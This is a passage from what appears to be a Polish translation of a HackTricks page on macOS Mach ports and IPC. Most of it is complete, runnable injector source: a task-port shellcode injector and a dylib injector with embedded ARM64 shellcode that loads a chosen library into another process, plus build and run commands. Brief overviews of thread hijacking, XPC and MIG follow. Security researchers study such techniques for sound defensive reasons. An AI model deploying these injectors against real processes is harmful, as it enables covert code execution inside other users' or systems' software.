fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</szczegóły>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Wstrzykiwanie dylib w wątek za pomocą portu zadania

W systemie macOS **wątki** mogą być manipulowane za pomocą **Mach** lub za pomocą **api `pthread` posix**. Wątek, który wygenerowaliśmy w poprzednim wstrzykiwaniu, został wygenerowany za pomocą api Mach, więc **nie jest zgodny z posix**.

Było możliwe **wstrzyknięcie prostego shellcode'u** w celu wykonania polecenia, ponieważ **nie było konieczne korzystanie z api zgodnego z posix**, tylko z Mach. **Bardziej złożone wstrzyknięcia** wymagałyby, aby **wątek** był również **zgodny z posix**.

Dlatego, aby **ulepszyć wątek**, powinien on wywołać **`pthread_create_from_mach_thread`**, który **utworzy prawidłowy wątek pthread**. Następnie ten nowy wątek pthread mógłby **wywołać dlopen**, aby **załadować dylib** z systemu, więc zamiast pisania nowego shellcode'u do wykonania różnych działań, można załadować niestandardowe biblioteki.

Możesz znaleźć **przykładowe dyliby** w (na przykład ten, który generuje logi, a następnie możesz je odsłuchać):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nie można ustawić uprawnień pamięci dla kodu zdalnego wątku: Błąd %s\n", mach_error_string(kr));
return (-4);
}

// Ustaw uprawnienia na przydzielonej pamięci stosu
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Nie można ustawić uprawnień pamięci dla stosu zdalnego wątku: Błąd %s\n", mach_error_string(kr));
return (-4);
}


// Utwórz wątek do uruchomienia shellcode'u
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // to jest prawdziwy stos
//remoteStack64 -= 8;  // potrzebne wyrównanie do 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Zdalny stos 64  0x%llx, Zdalny kod to %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Nie można utworzyć zdalnego wątku: błąd %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Użycie: %s _pid_ _akcja_\n", argv[0]);
fprintf (stderr, "   _akcja_: ścieżka do dylib na dysku\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib nie znaleziony\n");
}

}
```
</szczegóły>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Przechwytywanie wątku za pomocą portu zadania <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

W tej technice przechwytywany jest wątek procesu:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### Podstawowe informacje

XPC, co oznacza Komunikację Międzyprocesową XNU (jądro używane przez macOS), to framework do **komunikacji między procesami** na macOS i iOS. XPC zapewnia mechanizm do **bezpiecznych, asynchronicznych wywołań metod między różnymi procesami** w systemie. Jest to część paradygmatu bezpieczeństwa Apple, pozwalająca na **tworzenie aplikacji z podziałem uprawnień**, gdzie każdy **komponent** działa tylko z **uprawnieniami, których potrzebuje** do wykonania swojej pracy, ograniczając tym samym potencjalne szkody pochodzące od skompromitowanego procesu.

Aby uzyskać więcej informacji na temat tego, jak ta **komunikacja działa** i jak **może być podatna**, sprawdź:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Generator Interfejsu Mach

MIG został stworzony, aby **uproszczyć proces tworzenia kodu Mach IPC**. Dzieje się tak, ponieważ wiele pracy związanej z programowaniem RPC obejmuje te same czynności (pakowanie argumentów, wysyłanie wiadomości, rozpakowywanie danych na serwerze...).

MIG **generuje potrzebny kod** do komunikacji między serwerem a klientem na podstawie określonej definicji (w języku IDL - Interface Definition Language -). Nawet jeśli wygenerowany kod jest brzydki, programista będzie musiał go tylko zaimportować, a jego kod będzie znacznie prostszy niż wcześniej.

Aby uzyskać więcej informacji, sprawdź:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## Odnośniki

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
